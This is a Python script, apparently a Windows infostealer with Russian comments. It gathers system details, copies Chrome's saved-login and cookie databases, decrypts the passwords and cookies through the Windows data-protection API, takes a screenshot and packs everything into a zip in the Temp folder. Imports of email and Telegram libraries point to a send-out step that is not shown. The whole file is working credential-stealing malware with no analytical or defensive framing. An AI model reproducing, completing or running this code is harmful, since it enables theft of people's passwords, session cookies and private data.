import os
from Crypto.Hash import SHA512
import sqlite3
import win32crypt
import email, ssl
import shutil
import requests
import zipfile
import getpass
import ip2geotools
import win32api
import platform
import tempfile
import smtplib
import time
import cv2
import sys
from PIL import ImageGrab
from Tools.demo.mcast import sender
from ip2geotools.databases.noncommercial import DbIpCity
from os.path import basename
from smtplib import SMTP
from base64 import encodebytes
import random
import telebot
import codecs
import chardet

drives=str(win32api.GetLogicalDrives())
drives = str(drives.split('\000')[:-1])

all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() +'\nДиски:' + drives
file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+") #создаем txt с его расположением
file.write(all_data)#записываем данные
file.close()#выходим
def Chrome():
    text = 'Passwords Chrome:\nURL | LOGIN | PASSWORD\n'
    try:
        login_data_path = os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if os.path.exists(login_data_path):
            # Создаем копию файла базы данных
            shutil.copy2(login_data_path, login_data_path + '2')
            with sqlite3.connect(login_data_path + '2') as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                
                for result in cursor.fetchall():
                    url = result[0]
                    login = result[1]
                    password_encrypted = result[2]

                    if password_encrypted:
                        try:
                            # Создаем DATA_BLOB из зашифрованного пароля
                            password_blob = win32crypt.CryptUnprotectData(password_encrypted)[1]
                            password = password_blob.decode()
                            text += f"{url} | {login} | {password}\n"
                        except Exception as e:
                            text += f"{url} | {login} | ERROR: {str(e)}\n"
                    else:
                        text += f"{url} | {login} | No password found\n"
    except Exception as e:
        print(f"Error gathering Chrome passwords: {e}")
    
    return text
   
file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+") #создаем txt с его расположением
file.write(str(Chrome()) + '\n')#записываем данные
file.close()
def Chrome_cockie():
   textc = 'Cookies Chrome:' + '\n'
   textc += 'URL | COOKIE | COOKIE NAME' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
       cursor = conn.cursor()
       cursor.execute("SELECT * from cookies")
       for result in cursor.fetchall():
           cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
           name = result[2]
           url = result[1]
           textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
   return textc
file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+") 
file.write(str(Chrome_cockie()) + '\n')
file.close()

screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')

zname = r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
NZ = zipfile.ZipFile(zname,'w')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg')
NZ.close() 
doc = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
